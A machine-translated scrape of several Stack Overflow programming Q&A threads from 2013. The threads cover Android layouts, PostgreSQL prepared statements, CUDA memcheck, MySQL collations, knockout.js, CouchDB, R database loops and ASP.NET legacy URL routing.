02-15 14:31:28.981: E/AndroidRuntime(536):  at dalvik.system.NativeStart.main(Native Method)
02-15 14:31:28.981: E/AndroidRuntime(536): Caused by: java.lang.NullPointerException
02-15 14:31:28.981: E/AndroidRuntime(536):  at net.androidbootcamp.racetickets.Main.onCreate(Main.java:31)
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.app.Activity.performCreate(Activity.java:4465)
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
02-15 14:31:28.981: E/AndroidRuntime(536):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1919)
02-15 14:31:28.981: E/AndroidRuntime(536):  ... 11 more 
```

**主.xml：**

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
  xmlns:tools="http://schemas.android.com/tools"
  android:layout_width="match_parent"
  android:layout_height="match_parent"
  tools:context=".Main" >

  <TextView
    android:id="@+id/textView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentTop="true"
    android:layout_centerHorizontal="true"
    android:text="Gateway Raceway"
    android:textSize="38sp" />

  <ImageView
    android:id="@+id/imageView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_below="@+id/textView1"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="68dp"
    android:src="@drawable/gateway" />

  <Button
    android:id="@+id/btnTickets"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_below="@+id/imageView1"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="72dp"
    android:text="Find Tickets"
    android:textSize="32sp" />

</RelativeLayout> 
```

**票证.xml（第 2 页）**

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
  android:layout_width="match_parent"
  android:layout_height="match_parent" >

  <TextView
    android:id="@+id/textView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentTop="true"
    android:layout_centerHorizontal="true"
    android:text="Gateway Tickets"
    android:textSize="38sp" />

  <TextView
    android:id="@+id/textView2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_below="@+id/textView1"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="44dp"
    android:text="Which Tickets do you want?"
    android:textSize="20sp" />

  <Spinner
    android:id="@+id/txtRacing"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_below="@+id/textView2"
    android:layout_marginTop="40dp"
    android:entries="@array/Type" />

  <Button
    android:id="@+id/btnBuy"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_centerHorizontal="true"
    android:layout_marginBottom="59dp"
    android:text="Buy Tickets"
    android:textSize="25sp" />

  <TextView
    android:id="@+id/txtPrice"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_above="@+id/btnBuy"
    android:layout_centerHorizontal="true"
    android:layout_marginBottom="36dp"
    android:text="results" />

  <EditText
    android:id="@+id/txtNumber"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_below="@+id/txtRacing"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="23dp"
    android:ems="10"
    android:hint="How many tickets?"
    android:inputType="number" >

    <requestFocus />
  </EditText>

</RelativeLayout> 
```

**主.java**

```
package net.androidbootcamp.racetickets;

import java.text.DecimalFormat;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;

public class Main extends Activity {

  double costPerTicket=15.00;
  int numberOfTickets;
  double totalCost;
  String groupChoice;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    final EditText tickets=(EditText) findViewById(R.id.txtNumber);
    final Spinner group = (Spinner) findViewById(R.id.txtRacing);
    Button cost = (Button) findViewById(R.id.btnBuy);
    final TextView result = ((TextView) findViewById(R.id.txtPrice));
    cost.setOnClickListener(new OnClickListener () {
      @Override
      public void onClick(View v) {
        //TODO Auto-generated method stub
        numberOfTickets = Integer.parseInt(tickets.getText().toString());
        totalCost = costPerTicket + numberOfTickets;
        DecimalFormat currency = new DecimalFormat ("###,###.##");
        groupChoice = group.getSelectedItem().toString();
        result.setText("Total Cost for" + groupChoice + " is " + currency.format(totalCost));
      }
    });

    Button b=(Button)findViewById(R.id.btnTickets);
    b.setOnClickListener(new OnClickListener () {
      public void onClick(View v) {
        //TODO Auto-generated method stub
        startActivity(new Intent(Main.this, Tickets.class));
      }
    });
  }

  @Override
  public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.main, menu);
    return true;
  }
} 
```

**票务.java**

```
package net.androidbootcamp.racetickets;

import android.app.Activity;
import android.os.Bundle;

public class Tickets extends Activity {
  @Override
  protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.tickets);
  }             
} 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T20:53:00.017

这条线

```
Button cost = (Button) findViewById(R.id.btnBuy); 
```

您在 main.java 类中调用的将不起作用。因为您的按钮是在tickets.xml 中声明的

我认为你必须更换

```
Button cost = (Button) findViewById(R.id.btnBuy); 
```

让它工作

```
Button cost = (Button) findViewById(R.id.btnTickets); 
```

# html - 菜单中的 Twitter Bootstrap scrollspy

> ID：14903044
> 
> 赞同：0
> 
> 时间：2013-02-15T20:45:46.800
> 
> 标签：html, twitter-bootstrap

我有一个带有指向另一个页面的链接的菜单（具有相同的菜单）现在我在主页上添加 scrollspy 并将主页中的部分添加到菜单中。现在我的菜单看起来像：

```
<li class=""><a href="/home">Home</a></li>
<li class=""><a href="/home/#foo">Foo</a></li>
<li class=""><a href="/home/#boo">Boo</a></li>
<li class=""><a href="/moo">Moo</a></li> 
```

但是滚动间谍不起作用。当我从部分链接中删除“/home/”时，scrollspy 有效，但菜单仅在主页上有效。有可能做我需要的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-25T11:16:48.170

我的解决方案是在服务器端检查我是否在主页上，如果不是，我在部分部分之前添加 /home。所以我的代码现在看起来像：

```
<li class=""><a href="/home">Home</a></li>
<li class=""><a href="@if(section.contains("home")){#foo} else{/home/{#foo}">Foo</a></li>
<li class=""><a href="@if(section.contains("home")){#boo} else{/home/{#boo}">Boo</a></li>
<li class=""><a href="/moo">Moo</a></li> 
```

服务器端的代码在 scala 中（我正在使用 play 框架），但在 php 和其他任何类似的代码中。

# java - 如何使用 JXL 编辑现有的 excel 文件

> ID：14903045
> 
> 赞同：1
> 
> 时间：2013-02-15T20:45:50.203
> 
> 标签：java, jxl

当我使用打开文件`WritableWorkbook`并向其中添加一些数据时，文件中已经存在的数据将被删除。有没有办法在保留预先存在的数据的同时编辑特定单元格中的数据？

# jquery - Zurb Foundation 3 Orbit 事件和回调？

> ID：14903047
> 
> 赞同：1
> 
> 时间：2013-02-15T20:45:59.533
> 
> 标签：jquery, zurb-foundation, orbit

我想知道 Zurb Foundation 3 Orbit Slider 是否有任何回调事件？

我需要有一个滑块，每张 X 幻灯片都会显示一条消息。我希望在显示/更改新幻灯片时有一个回调，所以我可以绑定到它并增加一个计数器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T20:50:52.613

在他们的文档中？[http://foundation.zurb.com/docs/orbit.php](http://foundation.zurb.com/docs/orbit.php)

`afterSlideChange`可供您使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-06T02:28:32.553

使用这个 $("#slidershow").on("orbit:before-slide-change", function(event) {

```
 }); 
```

# sql - 如何在准备好的语句中有两个 sql 查询？

> ID：14903049
> 
> 赞同：2
> 
> 时间：2013-02-15T20:46:01.793
> 
> 标签：sql, postgresql, prepared-statement

我想做这样的事情。

```
PREPARE addFriend(INTEGER, INTEGER) AS
    INSERT INTO friendRelation (u_id, friendid) VALUES ($1, $2),
    INSERT INTO friendRelation (u_id, friendid) VALUES ($2, $1); 
```

我在文档中没有看到这一点，所以要么无法完成，要么我做错了。如果您在准备好的语句中不能有 2 个查询，是否还有其他一些我不知道的 postgres 功能可以做到这一点？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-15T20:51:10.113

一个准备好的语句不能包含多个语句……但是这个特定的查询可以重写：

```
PREPARE addFriend(INTEGER, INTEGER) AS
    INSERT INTO friendRelation (u_id, friendid) VALUES ($1, $2), ($2, $1); 
```

或者，您可以编写一个函数来执行相同的操作：

```
CREATE OR REPLACE FUNCTION addFriend(INTEGER, INTEGER) RETURNS VOID AS
$$
BEGIN
    INSERT INTO …;
    INSERT INTO …;
END
$$ LANGUAGE plpgsql; 
```

请注意，您还必须`CREATE LANGUAGE plpgsql;`在某些时候运行才能将 plpgsql 语言添加到数据库中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-11-13T16:03:49.313

接受的答案部分正确，在您的特定情况下，您可以为多行运行一次插入。但是如果您需要运行多个不同的查询，您可以使用[WITH](https://www.postgresql.org/docs/9.1/static/queries-with.html)语法

```
WITH data_t (u1_id, u2_id) AS (
  VALUES($1::INTEGER, $2::INTEGER)
), inserted1 AS (
  INSERT INTO friendRelation (u_id, friendid) SELECT u1_id, u2_id FROM data_t
)
INSERT INTO friendRelation (u_id, friendid) SELECT u2_id, u1_id FROM data_t; 
```

# debugging - CUDA 内存检查器的粒度是多少？

> ID：14903063
> 
> 赞同：1
> 
> 时间：2013-02-15T20:47:07.743
> 
> 标签：debugging, cuda

我有一个在调试版本中工作但在发布版本中失败的内核。我怀疑我的读写越界，但 CUDA 内存检查器没有显示任何错误。所以，我做了一个测试，我用以下内核写和读越界：

```
__global__ void addKernel(int *c, const int *a, const int *b)
{
  int x[1];
  for (int i(0); i < 100; ++i) {
    x[i] = i;
  }
  int t(0);
  for (int i(0); i < 100; ++i) {
    t += x[i];
  }
  c[0] = t;
} 
```

CUDA 内存检查器没有捕获越界写入和读取。通过将循环增加到 1,000,000 轮，我能够检测到越界写入，这导致内核在 i = 502,586 处暂停（2MB 越界）。

这是 CUDA 内存检查器工作的预期粒度吗？我能做些什么来让它检测小的越界写入（大约几个字节？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-04-01T21:27:34.290

我认为你只是在这个例子中被优化绊倒了，正如已经建议的那样。

这是我的测试用例：

```
$ cat t1130.cu
#include <stdio.h>

__global__ void addKernel(int *c)
{
  int x[1];
  for (int i(0); i < 100; ++i) {
    x[i] = i;
#ifdef FORCE
  printf("%d ", i);
#endif
  }
  int t(0);
  for (int i(0); i < 100; ++i) {
    t += x[i];
  }
  c[0] = t;
}

int main(){

  int *d_c;
  cudaMalloc(&d_c, sizeof(int));
  addKernel<<<1,1>>>(d_c);
  cudaDeviceSynchronize();
}
$ nvcc -o t1130 t1130.cu
$ cuda-memcheck ./t1130
========= CUDA-MEMCHECK
========= ERROR SUMMARY: 0 errors
$ nvcc -DFORCE -o t1130 t1130.cu
$ cuda-memcheck ./t1130
========= CUDA-MEMCHECK
========= Invalid __local__ write of size 4
=========     at 0x00000168 in addKernel(int*)
=========     by thread (0,0,0) in block (0,0,0)
=========     Address 0x00fffd10 is out of bounds
=========     Saved host backtrace up to driver entry point at kernel launch time
=========     Host Frame:/lib64/libcuda.so.1 (cuLaunchKernel + 0x2cd) [0x15865d]
=========     Host Frame:./t1130 [0x16ca1]
=========     Host Frame:./t1130 [0x314b3]
=========     Host Frame:./t1130 [0x27a1]
=========     Host Frame:./t1130 [0x269c]
=========     Host Frame:./t1130 [0x26b6]
=========     Host Frame:./t1130 [0x2600]
=========     Host Frame:/lib64/libc.so.6 (__libc_start_main + 0xf5) [0x21d65]
=========     Host Frame:./t1130 [0x2489]
=========
0 1 2 3 ========= Program hit cudaErrorLaunchFailure (error 4) due to "unspecified launch failure" on CUDA API call to cudaDeviceSynchronize.
=========     Saved host backtrace up to driver entry point at error
=========     Host Frame:/lib64/libcuda.so.1 [0x2f31b3]
=========     Host Frame:./t1130 [0x354a6]
=========     Host Frame:./t1130 [0x2605]
=========     Host Frame:/lib64/libc.so.6 (__libc_start_main + 0xf5) [0x21d65]
=========     Host Frame:./t1130 [0x2489]
=========
========= ERROR SUMMARY: 2 errors
$ 
```

因此，如果我们按原样编译您的代码，它会在`cuda-memcheck`. 但是如果我们强制编译器生成实际的循环，那么就会检测到并报告无效访问。

还解释您的评论，如果我们在上述情况下使用`-G`而不是，也将检测并报告错误，因为优化被禁用。`-DFORCE``cuda-memcheck`

# knockout.js - knockout.js 在 Internet Explorer 中调用了两次计算的 observable

> ID：14903064
> 
> 赞同：3
> 
> 时间：2013-02-15T20:47:11.797
> 
> 标签：knockout.js

请看下面的简单示例；绑定到计算的 observable 的文本框。我的问题是 IE在文本框更新时调用了两次**write方法。**Firefox 和其他浏览器似乎没有这个问题。我在 IE 7 和 8 中观察到了这个问题。

首先，我做错了吗？如果不是，推荐的处理方法是什么？

```
<script>
    var viewModel = {
        myTestVar: "aaa"
    };

    viewModel.myTest = ko.computed({
        read: function () {
            return viewModel.myTestVar;
        },
        write: function (value) {
            alert(value);
            viewModel.myTestVar = value;
        },
        owner: viewModel
    });

    $(document).ready(function () {
        ko.applyBindings(viewModel);
    });
</script>
</head>
<body>
   <input data-bind="value:myTest",type="text" style="width:150px;" />
</body> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:11:03.443

该`value`绑定有一个特殊的部分用于处理 Internet Explorer 中的自动完成。这通常会导致两次写入。如果你不关心自动完成，你可以通过向 : 添加一个属性来关闭它`input`：

```
<input data-bind="value:myTest" type="text" style="width:150px;" autocomplete="off" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:01:53.697

试试这个：

```
write: function (value) {
    if(value != viewModel.myTestVar) {
        alert(value);
        viewModel.myTestVar = value;
    }
} 
```

由于 viewModel.myTestVar 不是可观察的，我不知道为什么调用两次写入，但检查应该防止实际的多次写入。

# mysql - 如何设置 MySQL 以正确处理 unicode 变音符号？

> ID：14903067
> 
> 赞同：3
> 
> 时间：2013-02-15T20:47:25.863
> 
> 标签：mysql, unicode, utf-8, collation, diacritics

这是一个奇怪的难题，AFAIK utf8_bin 应该保证每个口音都正确存储在数据库中，即没有一些奇怪的 ASCII 转换。所以我有这样的表：

```
DEFAULT CHARSET=utf8 COLLATE=utf8_bin 
```

然而，当我尝试根据 MySQL 比较/查询/诸如“Krąków”和“Kraków”之类的条目时，这是同一个字符串。

出于好奇，我还尝试了 utf8_polish，MySQL 声称对于波兰人来说，“a”和“ą”没有任何区别。

那么如何设置 MySQL 表，这样我就可以安全地存储 unicode 字符串，而不会丢失重音等？

*服务器：MySQL 5.5 + openSUSE 11.4，客户端：Windows 7 + MySQL Workbench 5.2。*

## 更新——创建表

```
CREATE TABLE `Cities` (
  `city_Name` VARCHAR(145) CHARACTER SET utf8 NOT NULL,
  PRIMARY KEY (`city_Name`)
) DEFAULT CHARSET=utf8 COLLATE=utf8_bin; 
```

请注意，我不能为列设置**不同**的utf8_bin，因为整个表都是 utf8_bin，所以实际上列的排序规则被重置为默认值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T21:11:18.543

*该解决方案的所有学分都**归于 bobince**，因此请对我的问题发表评论。*

这个问题的解决方案有点奇怪，我会冒着风险说 MySQL 在这方面被破坏了。

所以，假设我用 utf8 创建了一个表并且没有为列做任何事情。后来我意识到我需要严格比较字符，所以我将表和列的排序规则更改为 utf8_bin。解决了？

不，现在 MySQL 看到了——表确实是 utf8_bin，但列也是 utf8_bin，这意味着列使用表的 DEFAULT 排序规则。然而 MySQL 并没有意识到以前的默认值与当前的默认值不同。因此比较仍然不起作用。

因此，您必须摆脱列的默认值，使其超出排序规则“family”范围的某个外来值（如果“utf8xxx”表示没有其他“utf8xxx”）。一旦摆脱它，并且您在列排序规则中看到没有说“默认”的条目，您可以设置 utf8_bin，它现在评估为默认值，但是由于我们来自非默认排序规则，所以一切都按预期进行。

*不要忘记在每一步应用更改。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T15:13:27.153

MySQL 默认字符集和排序规则（它们是服务器范围的，但可以根据连接进行更改）在创建表时应用。创建表后更改默认值不会影响现有表。

字符集和排序规则是各个列的属性。它们可以从表范围的默认值中设置，但它们确实属于列。

一个 utf8 字符集应该足以允许正确表示所有欧洲语言。您绝对应该能够将“a”和“±”存储为两个不同的字符。

utf8-bin 的排序规则产生区分大小写和重音字符的*排序*规则。

以下是文本值和整理行为之间差异的一些示例。我使用了三个示例字符串：'abcd'、'ĄBCD' 和 'ąbcd'。最后两个有 A-ogonek 字母。

第一个示例表明，使用 utf8 字符表示和 utf8_general_ci 排序规则，三个字符串分别按照用户指定的方式显示，但它们比较相等。在不区分 a 和 ± 的排序规则中，这是可以预料的。这是一个典型的不区分大小写的排序规则，其中所有变体字符的排序等于没有任何变音符号的字符。

```
SET NAMES 'utf8' COLLATE 'utf8_general_ci';
SELECT 'abcd', 'ąbcd' , 'abcd' < 'ąbcd',  'abcd' = 'ąbcd';
                               false            true 
```

下一个示例显示在不区分大小写的波兰语排序规则中，a 在 ą 之前。我不懂波兰语，但我怀疑波兰电话簿中的 As 和 Ą 是分开的。

```
SET NAMES 'utf8' COLLATE 'utf8_polish_ci';
SELECT 'abcd', 'ĄBCD' , 'ąbcd', 'abcd' < 'ĄBCD', 'abcd' < 'ąbcd' , 'ąbcd' = 'ĄBCD' 
                                      true             true              true 
```

下一个示例显示了 utf8_bin 排序规则会发生什么。

```
SET NAMES 'utf8' COLLATE 'utf8_bin';
SELECT 'abcd', 'ĄBCD' , 'ąbcd', 'abcd' < 'ĄBCD', 'abcd' < 'ąbcd' , 'ąbcd' = 'ĄBCD' 
                                      true           true               false 
```

在这种情况下，需要注意一件不直观的事情。'abcd' < 'ĄBCD' 为真（而纯 ASCII 的 'abcd' < 'ABCD' 为假）。如果你从语言上思考，这是一个奇怪的结果。这是因为两个 A-ogonek 字符在 utf8 中的二进制值都高于所有 abc 和 ABC 字符。所以：如果你对 ORDER BY 操作使用 utf8-bin 排序规则，你会得到语言上奇怪的结果。

您是说“Krąków”和“Kraków”比较相等，您对此感到困惑。当使用的排序规则是 utf8_general_ci 时，它们*确实比较相等。*但他们不使用 utf8_bin 或 utf8_polish_ci。根据 MySQL 对波兰语的支持，城市名称的这两种拼写是不同的。

当你设计你的应用程序时，你需要理清你希望这一切在语言上如何工作。“Krąków”和“Kraków”是同一个地方吗？“Ąaron”和“Aaron”是同一个人吗？如果是这样，您需要 utf8_general_ci。

您可以考虑更改显示的表格，如下所示：

```
 ALTER TABLE Cities
MODIFY COLUMN city_Name 
              VARCHAR(145)
              CHARACTER SET utf8 
              COLLATE utf8_general_ci 
```

这将按照您想要的方式设置表格中的列。

# java - 无法使框布局工作

> ID：14903068
> 
> 赞同：0
> 
> 时间：2013-02-15T20:47:26.470
> 
> 标签：java, swing, layout, layout-manager, boxlayout

Java Swing 布局的新手。经过大量阅读，我认为对我来说最好的布局是盒子布局。我的 JDialogBox 上有一个 JTabbedPane。在 JTabbedPane 上，有四个 JPanel。我专注于布置其中一个面板，称为 pnlDivision。

我想要对这个面板做的是添加一系列可滚动的面板。面板将垂直堆叠在一起，每个面板将由一行组成。每个面板中都包含水平对齐的标签，用户可以选择其中的任何一个进行编辑。

目前，我什至无法在我的选项卡式面板上显示任何内容。首先关注基础知识，我有以下代码只是为了了解设置框布局的想法，其中包含一个可滚动的面板和一个标签。但是我的标签面板仍然是空白的。谁能看到这个基本代码有什么问题？我已经阅读了很多关于这方面的资源，但我无法摆脱困境。

非常感谢 ！

```
 JScrollPane myScroller = new JScrollPane();
    myScroller.setPreferredSize(new Dimension(250, 80));
    myScroller.setAlignmentX(LEFT_ALIGNMENT);

    JPanel myPane = new JPanel();
    myPane.setLayout(new BoxLayout(myPane, BoxLayout.PAGE_AXIS));
    JLabel lbl = new JLabel("label 1");

    myPane.add(lbl);
    myPane.add(Box.createRigidArea(new Dimension(0,4)));
    myPane.add(myScroller);
    myPane.setBorder(BorderFactory.createEmptyBorder(10,10,10,10));

    pnlDivision.add(myPane); 
```

编辑：

这是我设置选项卡式面板的代码。我使用了 IDE (NetBeans)，所以这是由 NetBeans 生成的。我只删除了与此问题相关的内容。如果我明显遗漏了任何行，请告诉我：

```
jTabbedPane1 = new javax.swing.JTabbedPane();
pnlDivision = new javax.swing.JPanel();
jTabbedPane1.addTab("division", null, pnlDivision, "Manage Sets for Division Problems");
getContentPane().add(jTabbedPane1);
jTabbedPane1.setBounds(70, 110, 610, 340); 
```

# javascript - 沙发数据库日期和溢出

> ID：14903070
> 
> 赞同：1
> 
> 时间：2013-02-15T20:47:31.637
> 
> 标签：javascript, mapreduce, couchdb

我需要使用 CouchDB 计算一个简单的任务。但是我遇到了一些问题：我无法正确转换 Sate 字符串表示中的时间戳。这是我的功能：

```
function(doc) {
    if (doc.temp > -50 && doc.temp < 50 ) {
        var date = new Date(doc.time); 
        emit(date, doc.temp);
    }
} 
```

我需要对同一小时内发生的不同事件进行分组。但是这个类产生一个空日期对象，我不明白为什么。

此外，我的计算平均值的reduce函数也不起作用，因为它会溢出。

```
function(keys, values) {
  return sum(values)/values.length;
} 
```

如果我更改为这种形式，我可以设法使第一个功能工作：

```
function(doc) {
    if (doc.temp > -50 && doc.temp < 50 ) {
        emit(Math.round(doc.time/360000), doc.temp);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:45:51.027

您的 reduce 函数不起作用的原因是它不处理 re-reduce 情况。

在您的 reduce 函数中，您在 reduce 函数中处理map 函数的*部分*结果。在这种情况下，rereduce 参数为 false。

您的reduce 函数还需要处理之前reduce 调用的*部分*结果。在这种情况下，rereduce 参数为真。

请参阅文档：[http ://wiki.apache.org/couchdb/Introduction_to_CouchDB_views#Reduce_vs_rereduce](http://wiki.apache.org/couchdb/Introduction_to_CouchDB_views#Reduce_vs_rereduce)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T07:24:00.470

CouchDB 提供了非常高效的内置 reduce 函数。当您需要计算平均值时，通常最好将其[`_stats`](http://wiki.apache.org/couchdb/Built-In_Reduce_Functions#A_stats)用作 reduce 函数，然后在`sum/count`客户端计算。

# r - 尝试在 R 中使用 forloop 聚合查询的数据

> ID：14903071
> 
> 赞同：0
> 
> 时间：2013-02-15T20:47:37.253
> 
> 标签：r, for-loop

我在创建一个循环时遇到了一些麻烦

1.  sql查询变量“sensorname”中的每个设备（这大约是30个元素，但将来会增加）
2.  获取与设备查询关联的数据表并将其放入单独的数据框“data1”中，但会不断添加。

下面是我的示例循环和 data1 看起来“正确”但不完整的示例。LSF20_3a0925 是变量 sensorname 中的最后一个元素，因此基本上循环运行 30 次，每次覆盖变量 data1 中的数据，直到最后一次运行。

```
library(RODBC)

  ch <- odbcConnect("SweetLab", uid='---', pwd='------')
  sqlQuery(ch, "use SweetDatabase")     
  sensorname <- sqlQuery(ch,paste("SELECT site_device.code 
                                   FROM site_device, device 
                                   WHERE site_device.did=device.id AND
                                   device.name='LSF20' 
                                   LIMIT 0, 1000;",
                             sep="")
                          )
for(k in 1:length(sensorname[[1]])){
  sqlQuery(ch, "use SweetAnalysis")  
  sql <- na.omit(sqlQuery(ch,paste("select * From ",sensorname[[1]][k],"_Events",sep="")));
  if (is.null(sql))
  {return(NULL)}
  data1 <- merge(sensorname[[1]][k],sql)
}

 #############################################
 data1
       x      row_names PeaksP1Time PeaksP1
 1  LSF20_3a0925    24  1346781683  5.076920
 2  LSF20_3a0925    31  1358444323  0.043240
 3  LSF20_3a0925    13  1358444463  0.133170
 4  LSF20_3a0925    12  1358445120  5.286443 
```

任何帮助都会非常感激我一般是编写代码的新手，所以如果这是一个愚蠢的问题，请原谅我。我在这个主题上搜索了一些，但老实说不太确定如何搜索这个主题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T21:16:24.503

经过一些调整，这看起来很棒！

```
 library(RODBC)
     ch <- odbcConnect("SweetLab", uid='***', pwd='******') 
    sqlQuery(ch, "use SweetDatabase")     
    sensorname <- sqlQuery(ch,paste("select site_device.code from site_device, device where site_device.did=device.id and device.name='LSF20' LIMIT 0, 1000;",sep=""));   
    sqlQuery(ch, "use SweetAnalysis") 
    Datalist <- lapply(sensorname[[1]],function(x){
     query <- paste("SELECT PeaksP1Time,PeaksP1  FROM ",x,"_Events",sep="")
     dat <- (na.omit(sqlQuery(ch,query)))
     data2.nlist<-list(device=x,data=dat)
names(Datalist)<-sensorname$code[1:30]     
 })
    close(ch) 
```

查看此列表的结构，我得到

```
> str(Datalist[1:3]) 
List of 3
 $ LSF20_39ecf7:List of 1
  ..$ :'data.frame':    306 obs. of  2 variables:
  .. ..$ PeaksP1Time: num [1:306] 1.35e+09 1.35e+09 1.35e+09 1.35e+09 1.35e+09 ...
  .. ..$ PeaksP1    : num [1:306] 4.5 4.379 0.706 3 0 ...
 $ LSF20_39cd3e:List of 1
  ..$ :'data.frame':    202 obs. of  2 variables:
  .. ..$ PeaksP1Time: num [1:202] 1.35e+09 1.35e+09 1.35e+09 1.35e+09 1.35e+09 ...
  .. ..$ PeaksP1    : num [1:202] 0.664 3.235 5.765 4.636 2.936 ...
  .. ..- attr(*, "na.action")=Class 'omit'  Named int [1:24] 203 204 205 206 207 208 209 210 211 212 ...
  .. .. .. ..- attr(*, "names")= chr [1:24] "203" "204" "205" "206" ...
 $ LSF20_3a09ac:List of 1
  ..$ :'data.frame':    42 obs. of  2 variables:
  .. ..$ PeaksP1Time: num [1:42] 1.35e+09 1.35e+09 1.35e+09 1.35e+09 1.35e+09 ...
  .. ..$ PeaksP1    : num [1:42] 5.589 2.897 2.713 1.706 0.831 ... 
```

现在我将进入下一个阶段，即同时绘制多个集合。

我的问题是我如何告诉 R 它应该在每个列表或特定列表中绘制数据。如果有人想使用可重现的东西，我有一个工作历史的保存文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:52:09.723

好的..没有可重复的例子，不清楚你问了什么。在这里我会怎么做..

1.  我打开连接
2.  我循环使用`lapply`来创建一个列表
3.  我关闭连接
4.  我将列表元素绑定到 data.frame 中。我假设你对不同的传感器表有相同的列。

    ```
     ch <- odbcConnect("SweetLab", uid='---', pwd='------')
     ll <- lapply(sensorname[[1]],function(x){
        query <- paste("SELECT *  FROM ",x,"_Events",sep="")
        dat <- na.omit(sqlQuery(ch,query))
        data.frame(sensor=x,dat)
     })
     close(ch)
     data1 <- do.call(rbind,ll) 
    ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T21:55:54.737

这是资源密集型的，但会起作用。

```
# before your for loop
results <- list()

#inside your for loop 
for (k ......) {
  ....
  ....
  results[[k]] <- sql
}

# after your for loop

Data1 <- do.call(rbind, results)   # if same schema
   # OR
Data1 <- do.call(merge, results)   # if different schema 
```

# asp.net-mvc - 旧版 PHP url 不会在 MVC 中调用自定义路由

> ID：14903072
> 
> 赞同：4
> 
> 时间：2013-02-15T20:47:38.967
> 
> 标签：asp.net-mvc, routing

我们最近用 asp.net MVC 网站替换了一个旧的 php 网站。为了防止搜索引擎中遗留 url 出现 404 错误，我们通过 - [http://www.mikesdotnetting.com/Article/108/Handling-Legacy-URLs-with-ASP.NET-MVC设置自定义遗留路由系统](http://www.mikesdotnetting.com/Article/108/Handling-Legacy-URLs-with-ASP.NET-MVC)

该代码在我的本地机器上运行，并重定向到正确的路线；但是，实时服务器发出 404。额外的问题/线索，404 不是我们自定义的 404 页面，而是 iis 6 默认页面。

**编码：**

```
public class LegacyUrlRoute: RouteBase
{
    // source: http://www.mikesdotnetting.com/Article/108/Handling-Legacy-URLs-with-ASP.NET-MVC
    public override RouteData GetRouteData(HttpContextBase httpContext)
    {
        const string status = "301 Moved Permanently";
        var request = httpContext.Request;
        var response = httpContext.Response;
        var legacyUrl = request.Url.ToString();
        var newUrl = "";

        if (legacyUrl.Contains(".php"))
        {

            newUrl = "/";
            if (legacyUrl.Contains("support/mailfilter.php"))
                newUrl = "/support/";
            else if (legacyUrl.Contains("/support/default.php"))
                newUrl = "/support/";
            else if (legacyUrl.Contains("/business/default.php"))
                newUrl = "/services/";
            else if (legacyUrl.Contains("/residential/default.php"))
                newUrl = "/services/";
            else if (legacyUrl.Contains("/about/default.php"))
                newUrl = "/home/about/";
            else if (legacyUrl.Contains("/jobs.php"))
                newUrl = "/jobs/";
            else if (legacyUrl.Contains("/support/links.php"))
                newUrl = "/support/";
            else if (legacyUrl.Contains("/support/settings.php"))
                newUrl = "/support/";
            else if (legacyUrl.Contains("/default.php"))
                newUrl = "/";

            response.Status = status;
            response.RedirectLocation = newUrl;
            response.End();
        }
        return null;
    }
    public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
    {
        return null;
    }
} 
```

**笔记：**

我们怀疑问题在于 iis 无法提供 php 页面，但我似乎无法在 iis 中找到解决问题的设置。就好像请求永远不会命中控制器代码、错误或其他。所有其他页面/路由都运行良好。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:03:25.290

找到了答案。

问题是由于如果扩展名为 .php，iis 永远不会启动 asp.net 服务。

解决方案是转到属性>主目录>配置，找到 .php 扩展名，将可执行路径更改为 asp.net 路径，并将其限制为“GET、HEAD、POST、DEBUG”或您喜欢的任何内容。我最初选择了“所有动词”单选按钮，但这不起作用。

